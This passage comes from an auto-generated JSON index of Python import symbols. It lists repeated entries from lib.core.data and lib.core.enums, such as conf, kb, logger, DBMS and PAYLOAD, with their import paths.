        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "importPath": "lib.core.data",
        "description": "lib.core.data",
        "isExtraImport": true,
        "detail": "lib.core.data",
        "documentation": {}
    },
    {
        "label": "CONTENT_TYPE",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "DBMS",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HASHDB_KEYS",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_TEST",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HTTPMETHOD",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "NOTE",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "NULLCONNECTION",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "PAYLOAD",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "PLACE",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "REDIRECTION",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "WEB_PLATFORM",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "CONTENT_TYPE",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HASHDB_KEYS",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_TEST",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HTTPMETHOD",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "NOTE",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "PAYLOAD",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "PLACE",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "DBMS",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "DBMS",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "FORK",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HASHDB_KEYS",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.core.enums",
        "description": "lib.core.enums",
        "isExtraImport": true,
        "detail": "lib.core.enums",
        "documentation": {}
    },
    {
        "label": "PAYLOAD",
